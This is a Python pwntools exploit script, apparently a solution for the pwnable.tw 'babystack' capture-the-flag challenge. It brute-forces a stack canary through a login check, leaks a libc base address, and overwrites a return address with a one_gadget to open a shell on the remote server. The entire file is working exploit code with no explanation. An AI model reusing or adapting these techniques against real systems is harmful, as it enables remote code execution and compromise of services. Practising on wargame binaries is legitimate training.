from pwn import *

libc = ELF('./libc_64.so.6')


def login(pw):
	r.sendlineafter('>> ', '1')
	r.sendafter(':', pw)

def leave():
	r.sendlineafter('>> ', '2')

def copy(content):
	r.sendlineafter('>> ', '3')
	r.sendafter(':', content)

def leak(length, offset):
	leak = ''
	for _ in range(length):
		for i in range(0x1, 0x100):
			guess = 'a'*offset + leak + chr(i) + '\x00'
			login(guess)
			if "Success" in r.recvline():
				leak += chr(i)
				r.sendlineafter('>> ', '1')
				break

		print "leak = ", leak

	return leak


#r = process('./babystack')
r = remote('chall.pwnable.tw', 10205)

# leak random
random = leak(16, 0)
print "random = ", random

login('a'*0x48)
login('\x00')
copy('a'*63)
r.sendlineafter('>> ', '1') # log out

# leak libc
libc_base = u64(leak(6, 8)+'\x00'*2) - 0x78439
print "libc_base @ ", hex(libc_base)
one_gadget = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
one_shot = libc_base + one_gadget[0]
print "one_shot @ ", hex(one_shot)

login('a'*0x40+random+'a'*0x18+p64(one_shot))
login('\x00')
copy('a'*63)
leave()

r.interactive()